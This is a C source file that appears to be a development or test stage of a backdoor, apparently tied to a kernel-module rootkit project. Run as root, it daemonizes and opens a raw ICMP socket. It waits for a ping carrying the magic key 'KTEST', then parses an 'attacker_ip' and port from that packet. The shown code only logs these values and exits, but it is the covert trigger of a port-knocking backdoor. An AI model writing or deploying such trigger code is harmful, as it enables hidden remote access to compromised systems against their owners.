#include <stdio.h>
#include <sys/types.h> 
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <netdb.h>
#include <unistd.h>
#include <ctype.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <signal.h>

#define PACKET_SIZE 	1024
#define KEY         	"KTEST"
#define KTEST_LOG    	"/home/hook/Projects/lkm/data/ping_log"

/* ICMP packet mode */
void ping_listener(void){
    int sockfd;
    int n;	
    int icmp_ksize;
    char buf[PACKET_SIZE + 1];
    struct ip *ip;
    struct icmp *icmp;
    FILE *file;
    const char *msg = "listen to pings ";

    icmp_ksize = strlen(KEY);
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    
    // write that we're listening to the log
    file = fopen( KTEST_LOG, "a+" );
    fwrite( msg, sizeof(char)*16, 1, file );
    fclose(file); 

    //Listen for icmp packets
    while(1){
        // get the icmp packet
        bzero(buf, PACKET_SIZE + 1);        
        n = recv(sockfd, buf, PACKET_SIZE,0);
        
        // If we received something
        if(n > 0){    
            ip = (struct ip *)buf;
            icmp = (struct icmp *)(ip + 1);
            
            // If ICMP_ECHO packet and if KEY matches  */
            if((icmp->icmp_type == ICMP_ECHO) && (memcmp(icmp->icmp_data, KEY, 
				icmp_ksize) == 0)){

                // read the ping message
                char attacker_ip[16];
                int attacker_port;
                bzero(attacker_ip, sizeof(attacker_ip));
                sscanf((char *)(icmp->icmp_data + icmp_ksize + 1), "%15s %d", 
						attacker_ip, &attacker_port);

                // write the ip to the log
                file = fopen( KTEST_LOG, "a+" );
                fwrite( attacker_ip, sizeof(char)*16, 1, file );
                fwrite( "\n", sizeof(char), 1, file );
                fclose(file); 
		exit(EXIT_SUCCESS);
            }
        }
    }
}

/*
 * main ()
 */
int main(int argc, char *argv[]){ 

    // Prevent zombies
    signal(SIGCLD, SIG_IGN); 
    chdir("/");    

    // Exit if it's already running
    if (fork() != 0)
        exit(EXIT_SUCCESS);
    
    // Requires root access
    if (getgid() != 0) {
        fprintf(stdout, "Run as root!\n");
        exit(EXIT_FAILURE);
    }
    
    ping_listener();
    return EXIT_SUCCESS;
}
